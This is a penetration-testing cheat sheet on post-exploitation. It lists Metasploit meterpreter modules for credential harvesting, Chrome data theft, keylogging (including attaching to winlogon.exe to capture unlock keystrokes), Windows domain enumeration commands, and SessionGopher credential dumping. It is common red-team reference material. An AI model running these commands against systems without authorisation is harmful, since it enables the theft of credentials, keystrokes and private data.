# Gather info
## Metasploit
* `meterpreter> run post/windows/gather/*`
* `meterpreter> run post/linux/gather/*`
* `meterpreter> run post/windows/gather/credentials/*`
* `meterpreter> run post/linux/gather/credentials/*`
* `run post/windows/gather/credentials/credential_collector`
* `meterpreter> run post/windows/gather/enum_domains`
* `meterpreter> run post/windows/gather/enum_ad_users`
* `meterpreter> run post/windows/gather/enum_shares`
* `meterpreter> run post/windows/gather/enum_applications`

## Windows
* `net view /domain`
* `net group "<domain-name>" /domain` - get list of domain controllers
* `net users`
* `net localgroup <group-name>`
* `net share`
</br>__Services__</br>
* `tasklist /svc`
</br>Privileges</br>
* `whoami /priv`
* `whoami /all`

## Linux
* `cat /etc/passwd`

## Cool resources
* Windows
    * https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US
    * https://tim3warri0r.blogspot.com/
* Linux
    * https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US
    * https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation
* OSX        - https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US
* Metasploit - https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1


# Gather data
## Metasploit
* `meterpreter> run scraper`
* `meterpreter> run winenum`
* `meterpreter> screenshot`
* keylogging
   * screen unlock          -> attach process to __winlogon.exe__
   * application keystrokes -> attach processes to __explorer.exe__
   * `meterpreter> keyscan_start` - start sniffer
   1. `meterpreter> keyscan_dump` - print keystrikes on screen
   2. `meterpreter> keyscan_stop` - stop sniffer
  </br>or</br>
   * `meterpreter> keylogrecorder` - start sniffer
 * `meterpreter> run post/windows/gather/credentials` - double tab to see all modules
 * `meterpreter> run post/windows/gather/enum_chrome` - chrome data: cookies, credentials, history
 * `meterpreter> run post/windows/gather/credentials/credential_collector`
 * `meterpreter> run post/multi/gather` - double tab to see all modules

## Other tools
* SessionGopher - dump local credentials (Windows)

## Cool resources
* https://wiki.zacheller.dev/pentest/post-exploitation/file-transfers

